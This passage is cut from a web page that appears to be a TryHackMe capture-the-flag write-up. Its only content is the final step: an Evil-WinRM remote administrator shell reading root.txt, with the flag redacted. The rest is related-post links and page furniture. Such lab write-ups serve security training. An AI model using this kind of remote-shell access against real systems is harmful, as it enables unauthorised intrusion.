</span></span><span class=line><span class=cl>*Evil-WinRM* PS C:<span class=se>\U</span>sers<span class=se>\A</span>dministrator<span class=se>\D</span>esktop&gt; <span class=nb>type</span> root.txt
</span></span><span class=line><span class=cl><span class=s2>&#34;THM{DELTED_FOR_FLAG_PROTECTION}&#34;</span>
</span></span><span class=line><span class=cl>*Evil-WinRM* PS C:<span class=se>\U</span>sers<span class=se>\A</span>dministrator<span class=se>\D</span>esktop&gt; </span></span></code></pre></div></div><hr><div class="not-prose my-6 print:hidden"><div class=ad-container><ins class=adsbygoogle style=display:block data-ad-client=ca-pub-3526678290068011 data-ad-slot=7160066188 data-ad-format=auto data-full-width-responsive=true></ins><script>(adsbygoogle=window.adsbygoogle||[]).push({})</script></div></div></div><h2 class="mt-8 text-2xl font-extrabold mb-10">Related</h2><section class="w-full grid gap-4 sm:grid-cols-2 md:grid-cols-3"><article class="article-link--related relative min-h-full min-w-full overflow-hidden rounded-lg border border-neutral-300 dark:border-neutral-600"><div class="flex-none relative overflow-hidden thumbnail_card_related"><img src=/img/blog_hu_be59c7de05deaafc.png role=presentation loading=lazy decoding=async fetchpriority=low class="not-prose absolute inset-0 w-full h-full object-cover"></div><div class=p-4><header><a href=/post/cyber-security-interview-questions-with-answers/ class="not-prose before:absolute before:inset-0 decoration-primary-500 dark:text-neutral text-xl font-bold text-neutral-800 hover:underline hover:underline-offset-2"><h2>Cyber Security Interview Questions With Answers</h2></a></header><div class="text-sm text-neutral-500 dark:text-neutral-400"><div class="flex flex-row flex-wrap items-center"><time datetime=2021-05-07T19:38:21+05:30>7 May 2021</time><span class="px-2 text-primary-500">&#183;</span><span>2645 words</span><span class="px-2 text-primary-500">&#183;</span><span title="Reading time">13 mins</span></div><div class="flex flex-row flex-wrap items-center"><a class="relative mt-[0.5rem] me-2" href=/categories/classroom/><span class="flex cursor-pointer"><span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">Classroom
</span></span></a><a class="relative mt-[0.5rem] me-2" href=/tags/notes/><span class="flex cursor-pointer"><span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">Notes
</span></span></a><a class="relative mt-[0.5rem] me-2" href=/tags/interview/><span class="flex cursor-pointer"><span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">Interview</span></span></a></div></div><div class="article-link__summary prose dark:prose-invert mt-1 line-clamp-5"></div></div><div class="px-6 pt-4 pb-2"></div></article><article class="article-link--related relative min-h-full min-w-full overflow-hidden rounded-lg border border-neutral-300 dark:border-neutral-600"><div class="flex-none relative overflow-hidden thumbnail_card_related"><img src=/img/blog_hu_be59c7de05deaafc.png role=presentation loading=lazy decoding=async fetchpriority=low class="not-prose absolute inset-0 w-full h-full object-cover"></div><div class=p-4><header><a href=/post/active-directory-exploitation-cheat-sheet/ class="not-prose before:absolute before:inset-0 decoration-primary-500 dark:text-neutral text-xl font-bold text-neutral-800 hover:underline hover:underline-offset-2"><h2>Active Directory Exploitation Cheat Sheet</h2></a></header><div class="text-sm text-neutral-500 dark:text-neutral-400"><div class="flex flex-row flex-wrap items-center"><time datetime=2021-05-07T14:00:36+05:30>7 May 2021</time><span class="px-2 text-primary-500">&#183;</span><span>4418 words</span><span class="px-2 text-primary-500">&#183;</span><span title="Reading time">21 mins</span></div><div class="flex flex-row flex-wrap items-center"><a class="relative mt-[0.5rem] me-2" href=/categories/classroom/><span class="flex cursor-pointer"><span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">Classroom
</span></span></a><a class="relative mt-[0.5rem] me-2" href=/tags/notes/><span class="flex cursor-pointer"><span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">Notes</span></span></a></div></div><div class="article-link__summary prose dark:prose-invert mt-1 line-clamp-5"></div></div><div class="px-6 pt-4 pb-2"></div></article><article class="article-link--related relative min-h-full min-w-full overflow-hidden rounded-lg border border-neutral-300 dark:border-neutral-600"><div class="flex-none relative overflow-hidden thumbnail_card_related"><img src=/img/blog_hu_be59c7de05deaafc.png role=presentation loading=lazy decoding=async fetchpriority=low class="not-prose absolute inset-0 w-full h-full object-cover"></div><div class=p-4><header><a href=/post/notes-osimodel-explained/ class="not-prose before:absolute before:inset-0 decoration-primary-500 dark:text-neutral text-xl font-bold text-neutral-800 hover:underline hover:underline-offset-2"><h2>Notes OSIModel Explained</h2></a></header><div class="text-sm text-neutral-500 dark:text-neutral-400"><div class="flex flex-row flex-wrap items-center"><time datetime=2021-04-25T20:20:59+05:30>25 April 2021</time><span class="px-2 text-primary-500">&#183;</span><span>252 words</span><span class="px-2 text-primary-500">&#183;</span><span title="Reading time">2 mins</span></div><div class="flex flex-row flex-wrap items-center"><a class="relative mt-[0.5rem] me-2" href=/categories/classroom/><span class="flex cursor-pointer"><span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">Classroom
</span></span></a><a class="relative mt-[0.5rem] me-2" href=/tags/notes/><span class="flex cursor-pointer"><span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">Notes
</span></span></a><a class="relative mt-[0.5rem] me-2" href=/tags/osi-model/><span class="flex cursor-pointer"><span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">OSI Model
</span></span></a><a class="relative mt-[0.5rem] me-2" href=/tags/wireshark/><span class="flex cursor-pointer"><span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">Wireshark</span></span></a></div></div><div class="article-link__summary prose dark:prose-invert mt-1 line-clamp-5"></div></div><div class="px-6 pt-4 pb-2"></div></article></section></div></section><footer class="pt-8 max-w-prose print:hidden"><div class=pt-8><hr class="border-dotted border-neutral-300 dark:border-neutral-600"><div class="flex justify-between pt-3"><span class="flex flex-col"><a class="flex text-neutral-700 hover:text-primary-600 dark:text-neutral dark:hover:text-primary-400" href=/post/cyber-security-interview-questions-with-answers/><span class=leading-6><span class="inline-block rtl:rotate-180">&larr;</span>&ensp;Cyber Security Interview Questions With Answers
</span></a><span class="ms-6 mt-1 text-xs text-neutral-500 dark:text-neutral-400"><time datetime=2021-05-07T19:38:21+05:30>7 May 2021</time>
</span></span><span class="flex flex-col items-end"><a class="flex text-right text-neutral-700 hover:text-primary-600 dark:text-neutral dark:hover:text-primary-400" href=/post/thm-room-openvas/><span class=leading-6>Try Hack Me Room Room Openvas&ensp;<span class="inline-block rtl:rotate-180">&rarr;</span>
</span></a><span class="me-6 mt-1 text-xs text-neutral-500 dark:text-neutral-400"><time datetime=2021-05-10T01:36:51+05:30>10 May 2021</time></span></span></div></div></footer></article><div id=scroll-to-top class="fixed bottom-6 end-6 z-50 transform translate-y-4 opacity-0 duration-200"><a href=#the-top class="pointer-events-auto flex h-12 w-12 items-center justify-center rounded-full bg-neutral/50 text-xl text-neutral-700 hover:text-primary-600 dark:bg-neutral-800/50 dark:text-neutral dark:hover:text-primary-400" aria-label="Scroll to top" title="Scroll to top">&uarr;</a></div></main><footer id=site-footer class="py-10 print:hidden"><nav class="flex flex-row pb-4 text-base font-medium text-neutral-500 dark:text-neutral-400"><ul class="flex list-none flex-col sm:flex-row"><li class="flex mb-1 text-end sm:mb-0 sm:me-7 sm:last:me-0"><a class="decoration-primary-500 hover:underline hover:decoration-2 hover:underline-offset-2 flex items-center" href=/tags/ title=Tags>Tags</a></li><li class="flex mb-1 text-end sm:mb-0 sm:me-7 sm:last:me-0"><a class="decoration-primary-500 hover:underline hover:decoration-2 hover:underline-offset-2 flex items-center" href=/categories/ title=Categories>Categories</a></li></ul></nav><div class="flex items-center justify-between"><p class="text-sm text-neutral-500 dark:text-neutral-400">YOU CAN REUSE MY CONTENT</p><p class="text-xs text-neutral-500 dark:text-neutral-400">Powered by <a class="hover:underline hover:decoration-primary-400 hover:text-primary-500" href=https://gohugo.io/ target=_blank rel="noopener noreferrer">Hugo</a> & <a class="hover:underline hover:decoration-primary-400 hover:text-primary-500" href=https://blowfish.page/ target=_blank rel="noopener noreferrer">Blowfish</a></p></div><script>mediumZoom(document.querySelectorAll("img:not(.nozoom)"),{margin:24,background:"rgba(0,0,0,0.5)",scrollOffset:0})</script></footer><div id=search-wrapper class="invisible fixed inset-0 flex h-screen w-screen cursor-default flex-col bg-neutral-500/50 p-4 backdrop-blur-sm dark:bg-neutral-900/50 sm:p-6 md:p-[10vh] lg:p-[12vh] z-500" data-url=https://classroom.anir0y.in/><div id=search-modal class="flex flex-col w-full max-w-3xl min-h-0 mx-auto border rounded-md shadow-lg top-20 border-neutral-200 bg-neutral dark:border-neutral-700 dark:bg-neutral-800"><header class="relative z-10 flex items-center justify-between flex-none px-2"><form class="flex items-center flex-auto min-w-0"><div class="flex items-center justify-center w-8 h-8 text-neutral-400"><span class="relative block icon"><svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7 405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9.0 208 0S0 93.1.0 208s93.1 208 208 208c48.3.0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9.0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7.0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7.0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg></span></div><input type=search id=search-query class="flex flex-auto h-12 mx-1 bg-transparent appearance-none focus:outline-dotted focus:outline-2 focus:outline-transparent" placeholder=Search tabindex=0></form><button id=close-search-button class="flex items-center justify-center w-8 h-8 text-neutral-700 hover:text-primary-600 dark:text-neutral dark:hover:text-primary-400" title="Close (Esc)">
<span class="relative block icon"><svg viewBox="0 0 320 512"><path fill="currentColor" d="M310.6 361.4c12.5 12.5 12.5 32.75.0 45.25C304.4 412.9 296.2 416 288 416s-16.38-3.125-22.62-9.375L160 301.3 54.63 406.6C48.38 412.9 40.19 416 32 416S15.63 412.9 9.375 406.6c-12.5-12.5-12.5-32.75.0-45.25l105.4-105.4L9.375 150.6c-12.5-12.5-12.5-32.75.0-45.25s32.75-12.5 45.25.0L160 210.8l105.4-105.4c12.5-12.5 32.75-12.5 45.25.0s12.5 32.75.0 45.25l-105.4 105.4L310.6 361.4z"/></svg></span></button></header><section class="flex-auto px-2 overflow-auto"><ul id=search-results></ul></section></div></div></div></body></html>